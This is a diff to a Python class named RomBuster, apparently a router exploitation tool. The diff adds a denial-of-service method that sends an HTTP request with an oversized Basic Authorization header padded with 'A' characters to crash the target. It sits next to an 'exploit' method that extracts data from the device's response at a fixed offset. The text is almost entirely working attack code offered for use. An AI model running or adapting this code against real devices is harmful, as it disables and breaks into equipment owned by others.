@@ -38,6 +38,15 @@ class RomBuster:
             return None
         return response
 
+    def dos(self, host):
+        headers = {
+            "Authorization": """Basic
+            
+""" + 'A' * 348
+        }
+
+        requests.get(f"http://{host}/", headers=headers, verify=False, timeout=1)
+
     def exploit(self, response):
         if response.status_code == 200:
             data = response.content[8568:]
